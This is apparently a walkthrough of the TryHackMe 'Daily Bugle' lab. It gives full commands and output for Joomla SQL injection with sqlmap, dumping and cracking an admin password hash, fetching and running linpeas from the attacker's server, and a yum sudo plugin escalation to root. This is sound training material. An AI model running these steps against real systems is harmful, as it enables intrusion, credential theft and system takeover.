# Daily Bugle

[https://tryhackme.com/room/dailybugle](https://tryhackme.com/room/dailybugle)

Nmap :

```markdown
└─# nmap 10.48.156.78 -p- -sC -sV
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 11:46 +0530
Nmap scan report for 10.48.156.78
Host is up (0.065s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-generator: Joomla! - Open Source Content Management
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.65 seconds
```

- doing directory busting didn’t give any good result

cmseek :

finding the joomla cms version

```markdown

 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA

 [+]  Deep Scan Results  [+] 

[✔] Target: http://10.48.156.78
[✔] Detected CMS: Joomla
[✔] CMS URL: https://joomla.org
[✔] Joomla Version: redacted
[✔] Readme file: http://10.48.156.78/README.txt
[✔] Admin URL: http://10.48.156.78administrator

[✔] Open directories: 4
[*] Open directory url: 
   [>] http://10.48.156.78administrator/modules
   [>] http://10.48.156.78administrator/templates
   [>] http://10.48.156.78images/banners
   [>] http://10.48.156.78administrator/components

[x] Core vulnerability database not found!

 CMSeeK says ~ adieu
                        
```

the version is `X.X.X` we check for known vulnerabilities for the cms with that version 

searchsploit :

```markdown
└─# searchsploit joomla Redacted
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! X.X - SQL Injection                                                                                                                         | php/remote/44227.php
Joomla! X.X.X - 'com_fields' SQL Injection                                                                                                          | php/webapps/42033.txt
Joomla! Component ARI Quiz X.X.X - SQL Injection                                                                                                    | php/webapps/46769.txt
Joomla! Component com_realestatemanager X.X - SQL Injection                                                                                         | php/webapps/38445.txt
Joomla! Component Easydiscuss < X.X.X - Cross-Site Scripting                                                                                       | php/webapps/43488.txt
Joomla! Component J2Store < X.X.X - SQL Injection                                                                                                   | php/webapps/46467.txt
Joomla! Component JomEstate PRO X.X - 'id' SQL Injection                                                                                            | php/webapps/44117.txt
Joomla! Component Jtag Members Directory X.X.X - Arbitrary File Download                                                                            | php/webapps/43913.txt
Joomla! Component Quiz Deluxe X.X.X - SQL Injection                                                                                                 | php/webapps/42589.txt
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

we get two hits one is manual work and other is automatic

php/remote/44227.php :

The Exploit-DB exploit (`44227.php`) is a web-based PHP exploit rather than a command-line script. Running it with `php 44227.php` only executes the PHP file directly and prints its HTML output to the terminal. Since the exploit uses an HTML form and expects HTTP requests, I hosted it using PHP's built-in web server with `php -S 127.0.0.1:8000` and accessed it through a browser.

![image.png](image.png)

we have a field to enter out target 

![image.png](image%201.png)

we find administrator creds for joomla

Manual Way :

we read the other hit in searchsploit `php/webapps/42033.txt` 

```markdown
searchsploit -x php/webapps/42033.txt
```

```markdown
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917

URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27

Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
```

we see that we have to use 

```markdown
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p "list[fullordering]"
```

replacing localhost with our target ip :

```markdown
sqlmap -u "http://10.48.156.78/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p "list[fullordering]"
```

we see that we have 5 databases :

```markdown
└─# sqlmap -u "http://10.48.156.78/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p "list[fullordering]"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.8#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:38:25 /2026-08-24/

[12:38:25] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[12:38:25] [INFO] resuming back-end DBMS 'mysql' 
[12:38:25] [INFO] testing connection to the target URL
[12:38:25] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=u5k13nu2vjj...0sbv0qq1e1'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5565 FROM(SELECT COUNT(*),CONCAT(0x71766b6a71,(SELECT (ELT(5565=5565,1))),0x71706a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5832 FROM (SELECT(!SLEEP(5)))Dqxc)
---
[12:38:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: Apache 2.4.6, PHP 5.6.40
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[12:38:27] [INFO] fetching database names
[12:38:27] [INFO] resumed: 'information_schema'
[12:38:27] [INFO] resumed: 'joomla'
[12:38:27] [INFO] resumed: 'mysql'
[12:38:27] [INFO] resumed: 'performance_schema'
[12:38:27] [INFO] resumed: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[12:38:27] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[12:38:27] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.48.156.78'

[*] ending @ 12:38:27 /2026-08-24/

```

we enumerate `joomla` database :

```markdown
sqlmap -u "http://10.48.156.78/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla --tables -p "list[fullordering]"
```

```markdown
└─# sqlmap -u "http://10.48.156.78/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla --tables -p "list[fullordering]"
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.10.8#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:50:57 /2026-08-24/

[12:50:57] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[12:50:58] [INFO] resuming back-end DBMS 'mysql' 
[12:50:58] [INFO] testing connection to the target URL
[12:50:58] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=2rh9eh7jats...splbipoie5'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5565 FROM(SELECT COUNT(*),CONCAT(0x71766b6a71,(SELECT (ELT(5565=5565,1))),0x71706a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5832 FROM (SELECT(!SLEEP(5)))Dqxc)
---
[12:50:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: Apache 2.4.6, PHP 5.6.40
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[12:50:59] [INFO] fetching tables for database: 'joomla'
[12:50:59] [WARNING] reflective value(s) found and filtering out
[12:50:59] [INFO] retrieved: '#__assets'
[12:51:00] [INFO] retrieved: '#__associations'
[12:51:00] [INFO] retrieved: '#__banner_clients'
[12:51:00] [INFO] retrieved: '#__banner_tracks'
[12:51:00] [INFO] retrieved: '#__banners'
[12:51:00] [INFO] retrieved: '#__categories'
[12:51:00] [INFO] retrieved: '#__contact_details'
[12:51:00] [INFO] retrieved: '#__content'
[12:51:00] [INFO] retrieved: '#__content_frontpage'
[12:51:01] [INFO] retrieved: '#__content_rating'
[12:51:01] [INFO] retrieved: '#__content_types'
[12:51:01] [INFO] retrieved: '#__contentitem_tag_map'
[12:51:01] [INFO] retrieved: '#__core_log_searches'
[12:51:01] [INFO] retrieved: '#__extensions'
[12:51:01] [INFO] retrieved: '#__fields'
[12:51:01] [INFO] retrieved: '#__fields_categories'
[12:51:01] [INFO] retrieved: '#__fields_groups'
[12:51:02] [INFO] retrieved: '#__fields_values'
[12:51:02] [INFO] retrieved: '#__finder_filters'
[12:51:02] [INFO] retrieved: '#__finder_links'
[12:51:02] [INFO] retrieved: '#__finder_links_terms0'
[12:51:02] [INFO] retrieved: '#__finder_links_terms1'
[12:51:02] [INFO] retrieved: '#__finder_links_terms2'
[12:51:02] [INFO] retrieved: '#__finder_links_terms3'
[12:51:02] [INFO] retrieved: '#__finder_links_terms4'
[12:51:02] [INFO] retrieved: '#__finder_links_terms5'
[12:51:03] [INFO] retrieved: '#__finder_links_terms6'
[12:51:03] [INFO] retrieved: '#__finder_links_terms7'
[12:51:03] [INFO] retrieved: '#__finder_links_terms8'
[12:51:03] [INFO] retrieved: '#__finder_links_terms9'
[12:51:03] [INFO] retrieved: '#__finder_links_termsa'
[12:51:03] [INFO] retrieved: '#__finder_links_termsb'
[12:51:03] [INFO] retrieved: '#__finder_links_termsc'
[12:51:03] [INFO] retrieved: '#__finder_links_termsd'
[12:51:04] [INFO] retrieved: '#__finder_links_termse'
[12:51:04] [INFO] retrieved: '#__finder_links_termsf'
[12:51:04] [INFO] retrieved: '#__finder_taxonomy'
[12:51:04] [INFO] retrieved: '#__finder_taxonomy_map'
[12:51:04] [INFO] retrieved: '#__finder_terms'
[12:51:04] [INFO] retrieved: '#__finder_terms_common'
[12:51:04] [INFO] retrieved: '#__finder_tokens'
[12:51:04] [INFO] retrieved: '#__finder_tokens_aggregate'
[12:51:05] [INFO] retrieved: '#__finder_types'
[12:51:05] [INFO] retrieved: '#__languages'
[12:51:05] [INFO] retrieved: '#__menu'
[12:51:05] [INFO] retrieved: '#__menu_types'
[12:51:05] [INFO] retrieved: '#__messages'
[12:51:05] [INFO] retrieved: '#__messages_cfg'
[12:51:05] [INFO] retrieved: '#__modules'
[12:51:05] [INFO] retrieved: '#__modules_menu'
[12:51:06] [INFO] retrieved: '#__newsfeeds'
[12:51:06] [INFO] retrieved: '#__overrider'
[12:51:06] [INFO] retrieved: '#__postinstall_messages'
[12:51:06] [INFO] retrieved: '#__redirect_links'
[12:51:06] [INFO] retrieved: '#__schemas'
[12:51:06] [INFO] retrieved: '#__session'
[12:51:06] [INFO] retrieved: '#__tags'
[12:51:06] [INFO] retrieved: '#__template_styles'
[12:51:07] [INFO] retrieved: '#__ucm_base'
[12:51:07] [INFO] retrieved: '#__ucm_content'
[12:51:07] [INFO] retrieved: '#__ucm_history'
[12:51:07] [INFO] retrieved: '#__update_sites'
[12:51:07] [INFO] retrieved: '#__update_sites_extensions'
[12:51:07] [INFO] retrieved: '#__updates'
[12:51:07] [INFO] retrieved: '#__user_keys'
[12:51:07] [INFO] retrieved: '#__user_notes'
[12:51:08] [INFO] retrieved: '#__user_profiles'
[12:51:08] [INFO] retrieved: '#__user_usergroup_map'
[12:51:08] [INFO] retrieved: '#__usergroups'
[12:51:08] [INFO] retrieved: '#__users'
[12:51:08] [INFO] retrieved: '#__utf8_conversion'
[12:51:08] [INFO] retrieved: '#__viewlevels'
Database: joomla
[72 tables]
+----------------------------+
| #__assets                  |
| #__associations            |
| #__banner_clients          |
| #__banner_tracks           |
| #__banners                 |
| #__categories              |
| #__contact_details         |
| #__content_frontpage       |
| #__content_rating          |
| #__content_types           |
| #__content                 |
| #__contentitem_tag_map     |
| #__core_log_searches       |
| #__extensions              |
| #__fields_categories       |
| #__fields_groups           |
| #__fields_values           |
| #__fields                  |
| #__finder_filters          |
| #__finder_links_terms0     |
| #__finder_links_terms1     |
| #__finder_links_terms2     |
| #__finder_links_terms3     |
| #__finder_links_terms4     |
| #__finder_links_terms5     |
| #__finder_links_terms6     |
| #__finder_links_terms7     |
| #__finder_links_terms8     |
| #__finder_links_terms9     |
| #__finder_links_termsa     |
| #__finder_links_termsb     |
| #__finder_links_termsc     |
| #__finder_links_termsd     |
| #__finder_links_termse     |
| #__finder_links_termsf     |
| #__finder_links            |
| #__finder_taxonomy_map     |
| #__finder_taxonomy         |
| #__finder_terms_common     |
| #__finder_terms            |
| #__finder_tokens_aggregate |
| #__finder_tokens           |
| #__finder_types            |
| #__languages               |
| #__menu_types              |
| #__menu                    |
| #__messages_cfg            |
| #__messages                |
| #__modules_menu            |
| #__modules                 |
| #__newsfeeds               |
| #__overrider               |
| #__postinstall_messages    |
| #__redirect_links          |
| #__schemas                 |
| #__session                 |
| #__tags                    |
| #__template_styles         |
| #__ucm_base                |
| #__ucm_content             |
| #__ucm_history             |
| #__update_sites_extensions |
| #__update_sites            |
| #__updates                 |
| #__user_keys               |
| #__user_notes              |
| #__user_profiles           |
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+

[12:51:08] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 74 times
[12:51:08] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.48.156.78'

[*] ending @ 12:51:08 /2026-08-24/
```

we retrieve `72 tables`

we enumerate the columns in the table `#__users`

```markdown
sqlmap -u "http://10.48.156.78/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" --columns --dump -p "list[fullordering]"
```

```markdown
└─# sqlmap -u "http://10.48.156.78/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" --columns --dump -p "list[fullordering]"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:14:34 /2026-08-24/

[14:14:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:14:34] [INFO] resuming back-end DBMS 'mysql' 
[14:14:34] [INFO] testing connection to the target URL
[14:15:04] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[14:15:04] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with proxy switches ('--proxy', '--proxy-file'...)
[14:16:04] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=i9af9k6rgi6...8js42v6nk6'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5565 FROM(SELECT COUNT(*),CONCAT(0x71766b6a71,(SELECT (ELT(5565=5565,1))),0x71706a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5832 FROM (SELECT(!SLEEP(5)))Dqxc)
---
[14:16:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: PHP 5.6.40, Apache 2.4.6
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:16:06] [INFO] fetching columns for table '#__users' in database 'joomla'
[14:16:06] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
do you want to use common column existence check? [y/N/q] y
[14:16:09] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 

[14:16:10] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
[14:16:10] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 3
[14:16:14] [INFO] starting 3 threads
[14:16:14] [WARNING] reflective value(s) found and filtering out
[14:16:14] [INFO] retrieved: id                                                                                                                                                      
[14:16:14] [INFO] retrieved: name                                                                                                                                                    
[14:16:15] [INFO] retrieved: username                                                                                                                                                
[14:16:17] [INFO] retrieved: email                                                                                                                                                   
[14:16:39] [INFO] retrieved: password    
```

we view the values of those columns :

```markdown
sqlmap -u "http://10.48.156.78/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" -C name,email,id,password,username --dump -p "list[fullordering]"
```

```markdown
└─# sqlmap -u "http://10.48.156.78/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" -C name,email,id,password,username --dump -p "list[fullordering]"
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.8#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:21:59 /2026-08-24/

[14:21:59] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:21:59] [INFO] resuming back-end DBMS 'mysql' 
[14:21:59] [INFO] testing connection to the target URL
[14:22:00] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=ordcm98i1k4...4ogd3sahp0'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5565 FROM(SELECT COUNT(*),CONCAT(0x71766b6a71,(SELECT (ELT(5565=5565,1))),0x71706a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5832 FROM (SELECT(!SLEEP(5)))Dqxc)
---
[14:22:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: PHP 5.6.40, Apache 2.4.6
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:22:01] [INFO] fetching entries of column(s) '`name`,email,id,password,username' for table '#__users' in database 'joomla'
[14:22:01] [WARNING] reflective value(s) found and filtering out
[14:22:01] [INFO] retrieved: '1'
[14:22:01] [INFO] retrieved: 'Super User'
[14:22:01] [INFO] retrieved: 'jonah@tryhackme.com'
[14:22:02] [INFO] retrieved: '811'
[14:22:02] [INFO] retrieved: '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[14:22:02] [INFO] retrieved: 'jonah'
[14:22:02] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: joomla
Table: #__users
[1 entry]
+------------+---------------------+-----+--------------------------------------------------------------+----------+
| name       | email               | id  | password                                                     | username |
+------------+---------------------+-----+--------------------------------------------------------------+----------+
| Super User | Redacted            | 811 | Redacted                                                     | Redacted |
+------------+---------------------+-----+--------------------------------------------------------------+----------+

[14:22:11] [INFO] table 'joomla.`#__users`' dumped to CSV file '/root/.local/share/sqlmap/output/10.48.156.78/dump/joomla/___users.csv'
[14:22:11] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 8 times
[14:22:11] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.48.156.78'

[*] ending @ 14:22:11 /2026-08-24/
```

we see the password is hash we identify the mode and crack it using hashcat 

```markdown
└─# hashid -m 'Redacted'     
Analyzing 'Redacted'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
```

we crack it :

```markdown
└─# hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --show 
Redacted:Redacted
                                                                            
```

we log in:

![image.png](image%202.png)

we go to templates

![image.png](image%203.png)

we go to protostar details and files

we edit the `index.php` to :

![image.png](image%204.png)

![image.png](image%205.png)

we click save then the button `template preview` :

![image.png](image%206.png)

## Shell as apache :

![image.png](image%207.png)

we get `linpeas.sh` :

```markdown
python3 -m http.server 1111
```

![image.png](image%208.png)

from the apache shell :

we go to `/tmp` directory to have write perms

```markdown
cd /tmp
```

```markdown
wget http://your ip:1111/linpeas.sh
```

```markdown
chmod +x linpeas.sh
```

```markdown
./linpeas.sh
```

we find some open password in php config file :

![image.png](image%209.png)

we switch to the user `jjameson` with the password we found:

```markdown
bash-4.2$ su jjameson
Password: 
[jjameson@dailybugle tmp]$ 
```

we get the `user flag` :

![image.png](image%2010.png)

```markdown
sudo -l
```

we see that we can run the binary yum with sudo prev with no password :

we go to gtfo bins :

![image.png](image%2011.png)

we run the cmds :

```markdown
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

we get the `root flag` :

![image.png](image%2012.png)